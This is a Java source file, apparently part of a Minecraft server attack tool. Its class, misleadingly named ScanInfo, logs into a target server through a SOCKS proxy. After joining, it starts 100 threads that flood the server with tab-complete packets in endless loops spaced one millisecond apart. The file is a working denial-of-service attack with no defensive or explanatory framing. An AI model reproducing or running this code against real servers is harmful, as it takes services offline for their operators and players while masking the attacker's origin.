package me.alikomi.endminecraft.Tasks;

import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.entity.ServerEntityRotationPacket;
import org.spacehq.mc.protocol.packet.status.client.StatusPingPacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.net.InetSocketAddress;
import java.net.Proxy;

public class ScanInfo {
    public static void scan(String ip, int port) {
        MinecraftProtocol mc = new MinecraftProtocol("KoMiTest");
        //final Proxy p = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 1080));
        final Client client = new Client(ip, port, mc,new TcpSessionFactory(new Proxy(Proxy.Type.SOCKS,new InetSocketAddress("127.1",1080))));
        client.getSession().connect();
        client.getSession().addListener(new SessionListener() {

            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerChatPacket) {
                    System.out.println(packetReceivedEvent.getPacket().toString());
                    System.out.println(((ServerChatPacket) packetReceivedEvent.getPacket()).getMessage());
                }



                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {

                    for (int i = 0 ; i < 100 ; i ++) new Thread(() -> {
                        while (true) {
                            client.getSession().send(new ClientTabCompletePacket("/"));
                            try {
                                Thread.sleep(1);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }).start();



                }

                if (packetReceivedEvent.getPacket() instanceof ServerTabCompletePacket) {
                }
            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void connected(ConnectedEvent connectedEvent) {

            }

            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            public void disconnected(DisconnectedEvent disconnectedEvent) {
                System.out.println(disconnectedEvent.getReason());
            }
        });
    }
}
